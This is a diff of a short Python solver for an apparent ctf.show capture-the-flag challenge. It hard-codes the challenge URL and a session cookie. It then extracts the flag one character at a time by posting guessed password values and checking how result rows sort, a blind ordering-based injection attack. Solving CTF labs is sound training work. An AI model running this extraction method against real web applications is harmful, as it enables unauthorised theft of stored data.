@@ -1,7 +1,6 @@
 import requests
-url=input()
-cookie=input()
-param=input()
+url="https://d6de054a-781e-4910-976b-5b236140d353.challenge.ctf.show/user_main.php?order=3"
+cookie="b7fbe90eedaf98d734e1ad346d897c6e"
 str='-0123456789abcdefghijklmnopqrstuvwxyz{|}'
 flag=""
 for i in range(48):
@@ -14,7 +13,7 @@ for i in range(48):
             'password':index
         }
         t=requests.post(url,data=data,timeout=1)
-        t=requests.get(url,params=param,cookies=cookie,timeout=1).text
+        t=requests.get(url,cookies=cookie,timeout=1).text
         if t.find(f"<td>{flag}</td>")>t.find("<td>flag</td>"):
             flag=flag+str[j-1]
             print(flag)
